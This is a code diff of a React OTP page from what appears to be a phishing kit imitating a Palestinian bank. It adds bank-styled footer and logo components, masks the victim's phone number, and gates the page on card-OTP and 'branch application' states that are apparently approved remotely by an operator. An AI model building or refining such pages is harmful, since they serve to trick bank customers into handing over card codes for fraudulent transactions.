@@ -1,6 +1,8 @@
 import axios from "axios";
 import React, { useEffect, useRef, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
+import { BankSiteFooter } from "../components/BankSiteFooter";
+import { VisitorTopLogo } from "../components/VisitorTopLogo";
 import { BottomBar } from "../components/VisitorShared";
 import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
 import { PendingFormOverlay } from "../components/PendingFormOverlay";
@@ -9,15 +11,14 @@ import { api_route } from "../socketApi";
 import { useOrderSession } from "../hooks/useOrderSession";
 import { useTwoMinuteCountdown } from "../hooks/useTwoMinuteCountdown";
 
-function maskPhoneForOtpUi(raw) {
-  const d = String(raw || "").replace(/\D/g, "");
-  if (!d) return "+97XXXXX";
-  if (d.length <= 3) return `+${d}••••`;
-  const last = d.slice(-3);
-  const prefixLen = Math.min(3, d.length - 3);
-  const prefix = d.slice(0, prefixLen);
-  const middle = "•".repeat(Math.max(4, d.length - prefixLen - 3));
-  return `+${prefix}${middle}${last}`;
+function normalizeCountryCode(cc) {
+  const s = String(cc || "+970").trim();
+  return s === "+972" || s === "+970" ? s : "+970";
+}
+
+function otpMaskedLine(phoneCountryCode) {
+  const cc = normalizeCountryCode(phoneCountryCode);
+  return `${cc} *********`;
 }
 
 export default function Otp() {
@@ -25,7 +26,9 @@ export default function Otp() {
   const [cardOtpError, setCardOtpError] = useState("");
   const [formError, setFormError] = useState("");
   const [loading, setLoading] = useState(false);
-  const [maskedPhone, setMaskedPhone] = useState("+97XXXXX");
+  const [maskedPhone, setMaskedPhone] = useState(() =>
+    otpMaskedLine("+970"),
+  );
   const navigatedRef = useRef(false);
   const navigate = useNavigate();
   const location = useLocation();
@@ -33,13 +36,19 @@ export default function Otp() {
     location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
   const { t, dir: pageDir, textDir } = useLanguage();
 
-  const { cardOtpAccept, rejectReason, hydrated, reviewCardOtp } =
+  const { cardOtpAccept, rejectReason, hydrated, reviewCardOtp, branchApplicationAccepted } =
     useOrderSession(orderId);
 
   const { formatted: timerFormatted } = useTwoMinuteCountdown(120);
 
   const awaitingCardOtpDecision =
     hydrated && !!orderId && !cardOtpAccept && !rejectReason && reviewCardOtp;
+
+  useEffect(() => {
+    if (!hydrated || !orderId) return;
+    if (branchApplicationAccepted) return;
+    navigate("/branch", { replace: true, state: { orderId } });
+  }, [hydrated, branchApplicationAccepted, orderId, navigate]);
 
   useEffect(() => {
     if (!orderId) {
@@ -50,8 +59,8 @@ export default function Otp() {
     (async () => {
       try {
         const { data } = await axios.get(`${api_route}/order/${orderId}`);
-        if (!cancelled && data?.phone) {
-          setMaskedPhone(maskPhoneForOtpUi(data.phone));
+        if (!cancelled) {
+          setMaskedPhone(otpMaskedLine(data?.phoneCountryCode));
         }
       } catch {
         /* keep default +97XXXXX */
@@ -118,31 +127,25 @@ export default function Otp() {
       dir={pageDir}
     >
       <div
-        className="flex w-full max-w-[400px] flex-col items-center px-4 py-8 pb-14 lg:w-1/3"
+        className="flex w-full  flex-col items-center justify-between lg:w-1/3"
         dir={textDir}
       >
-        <img
-          src="/wix/landing-top-logo.png"
-          alt=""
-          width={134}
-          height={61}
-          className="mb-3 w-[134px] object-cover"
-          fetchPriority="high"
-        />
+        <VisitorTopLogo />
 
         <img
           src="/wix/otp-hero.png"
           alt=""
-          width={320}
-          height={181}
-          className="mb-4 w-full max-w-[320px] object-cover"
+          className="mb-4 w-full  object-cover"
           fetchPriority="high"
         />
 
         <div className="mb-4 w-full max-w-[320px] space-y-2 text-center text-[13px] font-bold leading-normal tracking-wide text-[#FF4040]">
           <p>{t("otp.smsNotice")}</p>
           <p dir="rtl">
-            {t("otp.enterCodePrefix")} {maskedPhone}
+            {t("otp.enterCodePrefix")}{" "}
+            <span className="inline-block" dir="ltr">
+              {maskedPhone}
+            </span>
           </p>
         </div>
 
@@ -205,12 +208,7 @@ export default function Otp() {
           </button>
         </form>
 
-        <img
-          src="/wix/otp-footer.png"
-          alt=""
-          className="mt-8 w-full  object-cover"
-          fetchPriority="high"
-        />
+        <BankSiteFooter className="mt-8 w-full" />
       </div>
 
       <BottomBar />
